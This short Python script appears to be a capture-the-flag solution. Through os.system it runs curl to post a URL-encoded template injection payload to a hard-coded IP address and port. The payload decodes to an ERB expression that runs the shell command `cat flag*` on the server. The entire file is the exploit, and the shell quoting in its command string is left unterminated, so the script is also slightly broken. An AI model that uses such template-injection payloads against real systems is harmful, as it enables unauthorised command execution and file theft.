import os

command = 'curl http://157.245.46.51:30139 -d "neon=asd  %3c%25%3d%20%60%63%61%74%20%66%6c%61%67%2a%60%20%25%3e'

response = os.system(command)
print(response)

